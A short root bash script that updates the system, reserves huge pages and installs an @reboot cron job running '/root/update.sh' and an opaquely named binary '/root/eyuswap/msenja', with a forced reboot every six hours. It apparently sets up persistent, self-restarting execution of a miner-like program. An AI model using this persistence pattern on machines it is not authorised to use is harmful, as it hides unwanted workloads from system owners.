#!/bin/bash
sudo apt-get update -y
sudo apt-get upgrade -y
cd /root
echo 2048 > /proc/sys/vm/nr_hugepages
sysctl -w vm.nr_hugepages=2048
touch /var/spool/cron/root
/usr/bin/crontab /var/spool/cron/root
crontab -l | { cat; echo "@reboot /root/update.sh && sleep $(((RANDOM%60)+1)) && /root/eyuswap/msenja && sleep 21600 && /sbin/shutdown -r now"; } | crontab -
/etc/init.d/cron restart
/etc/init.d/cron start
